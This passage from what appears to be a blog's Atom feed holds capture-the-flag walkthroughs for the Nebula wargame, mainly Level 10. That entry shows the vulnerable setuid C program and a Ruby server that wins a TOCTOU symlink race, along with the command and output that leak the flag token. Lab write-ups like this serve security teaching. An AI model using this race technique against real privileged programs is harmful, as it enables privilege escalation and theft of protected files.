same failure, and after that I changed the <em>cmd</em> from &ldquo;getflag&rdquo; to &ldquo;id&rdquo; ,
and the output is</p>

<p><code>bash
level11@nebula:~$ ./gen | ../flag11/flag11
blue = 1024, length = 1024, pink = 1024
uid=1012(level11) gid=1012(level11) groups=1012(level11)
</code></p>

<p>No privilege dropped )=</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 10]]></title>
    <link href="http://hanjc.me/blog/2014/01/24/nebula-level10/"/>
    <updated>2014-01-24T20:40:53-08:00</updated>
    <id>http://hanjc.me/blog/2014/01/24/nebula-level10</id>
    <content type="html"><![CDATA[<h3>About</h3>

<p>The setuid binary at <em>/home/flag10/flag10</em> binary will upload any file given, as long as it meets the requirements of the <em>access()</em> system call.</p>

<p>To do this level, log in as the <em>level10</em> account with the password <em>level10</em>. Files for this level can be found in /home/flag10.</p>

<h3>Source Code</h3>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;errno.h></h1>

<h1>include &lt;sys/socket.h></h1>

<h1>include &lt;netinet/in.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char <em><em>argv)
{
  char </em>file;
  char </em>host;</p>

<p>  if(argc &lt; 3) {</p>

<pre><code>printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
exit(1);
</code></pre>

<p>  }</p>

<p>  file = argv[1];
  host = argv[2];</p>

<p>  if(access(argv[1], R_OK) == 0) {</p>

<pre><code>int fd;
int ffd;
int rc;
struct sockaddr_in sin;
char buffer[4096];

printf("Connecting to %s:18211 .. ", host); fflush(stdout);

fd = socket(AF_INET, SOCK_STREAM, 0);

memset(&amp;sin, 0, sizeof(struct sockaddr_in));
sin.sin_family = AF_INET;
sin.sin_addr.s_addr = inet_addr(host);
sin.sin_port = htons(18211);

if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
  printf("Unable to connect to host %s\n", host);
  exit(EXIT_FAILURE);
}
</code></pre>

<h1>define HITHERE &ldquo;.oO Oo.\n&rdquo;</h1>

<pre><code>if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
  printf("Unable to write banner to host %s\n", host);
  exit(EXIT_FAILURE);
}
</code></pre>

<h1>undef HITHERE</h1>

<pre><code>printf("Connected!\nSending file .. "); fflush(stdout);

ffd = open(file, O_RDONLY);
if(ffd == -1) {
  printf("Damn. Unable to open file\n");
  exit(EXIT_FAILURE);
}

rc = read(ffd, buffer, sizeof(buffer));
if(rc == -1) {
  printf("Unable to read from file: %s\n", strerror(errno));
  exit(EXIT_FAILURE);
}

write(fd, buffer, rc);

printf("wrote file!\n");
</code></pre>

<p>  } else {</p>

<pre><code>printf("You don't have access to %s\n", file);
</code></pre>

<p>  }
}
```</p>

<!-- more -->


<p>There at two files in the directory /home/flag10, <em>flag10</em> and <em>token</em>. The source code of executable <em>flag10</em> in shown above, and <em>token</em> contains the password of user <em>flag10</em>. The goal is to read the content of <em>token</em>.</p>

<p>The attack comes from a common bug called <a href="http://en.wikipedia.org/wiki/Time-of-check-to-time-of-use">Time of check to time of use</a>, the Wiki page above explains precisely about what this bug is and how it can be exploited. So in my imagination this is how this attack would look like:</p>

<ol>
<li>pass <em>/home/level10/token</em> whick links to a real user(<em>level10</em>) readable file <em>/home/level10/test</em> to the program as <code>argv[1]</code></li>
<li><em>/home/flag10/flag10</em> checks whether this file is accessable at line 24(with the result true)</li>
<li>modify the file to link to <em>/home/flag10/token</em> when <em>/home/flag10/flag10</em> is executing code between line 24 and line 54</li>
<li>when <em>/home/flag10/flag10</em> reads the file at line 54, it reads <em>/home/flag10/token</em></li>
</ol>


<p>The most important step mentioned above is step 3, it is hard to control the time! Fortunately, the <em>flag10</em> program will send a banner before actually read the file(line 46), this leaves me some time to make some change!</p>

<p>Notice that the content of the file would be transmit through a socket connection, so I need to write my own server code. In my consideration, I need to change the file <em>/home/level10/token</em> immediately after the server accepts a connection from the client, I wrote this server code in Ruby:</p>

<p>``` ruby
require &lsquo;socket&rsquo;</p>

<p>server = TCPServer.new(18211)
loop {</p>

<pre><code>client = server.accept
`rm /home/level10/token; ln -s /home/flag10/token /home/level10/token`
while msg = client.gets
    puts "RECV: #{msg}"
end
</code></pre>

<p>}
```</p>

<p>After the server was started, I triggered the vulnerability with the following command</p>

<pre><code>$ /home/flag10/flag10 ~/token 127.0.0.1
</code></pre>

<p>Note that the symbolic file <em>~/token</em> must exist and point to a file that is readable by user <em>level10</em> before the program <em>flag10</em> is executed.</p>

<p>The output of the Ruby code was not always as expected, sometimes the client read the file before the server changed it, but as long as it could be right, it hacked!</p>

<p>``` bash
level10@nebula:~$ ruby serv.rb
RECV: .oO Oo.
RECV: hello world</p>

<p>level10@nebula:~$ ruby serv.rb
RECV: .oO Oo.
RECV: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```</p>
]]></content>
  </entry>
  
</feed>
